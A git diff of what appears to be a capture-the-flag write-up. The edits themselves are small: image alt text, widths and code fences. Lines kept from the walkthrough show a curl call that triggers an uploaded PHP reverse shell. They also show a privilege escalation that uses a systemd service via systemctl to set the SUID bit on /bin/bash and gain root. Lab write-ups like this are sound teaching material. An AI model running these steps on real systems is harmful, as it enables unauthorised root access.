@@ -120,14 +120,14 @@ curl http://<IP>:3333/internal/uploads/php-reverse-shell.phtml
 ```
 <br>
 <br>
-<img src="../images/curl.png" alt="content disposition" width="300"/>
+<img src="../images/curl.png" alt="curl command" width="500"/>
 <br>
 <br>
 
 This now gives us access to a reverse shell.
 <br>
 <br>
-<img src="../images/reverse_shell.png" alt="content disposition" width="300"/>
+<img src="../images/reverse_shell.png" alt="reverse shell" width="500"/>
 <br>
 <br>
 We can create a more interactive shell by:
@@ -179,7 +179,7 @@ Then just read the root flag file:
 ```
 cat /tmp/output
 ```
-We can also escalate to a bash shell with a slight change of "id".
+As mentioned above, we can also escalate to a bash shell with a slight change of "id". This is done by additing the SUID bit to /bin/bash.
 ```
 eop=$(mktemp).service
 echo '[Service]
@@ -193,6 +193,7 @@ WantedBy=multi-user.target' > $eop
 /bin/systemctl enable --now $eop
 ```
 This changes the SUID of bash to allow us to use as root. We simply:
-```bash -p
 ```
+bash -p
+````
 And now we have root permissions in the shell. Again use to read the flag file.
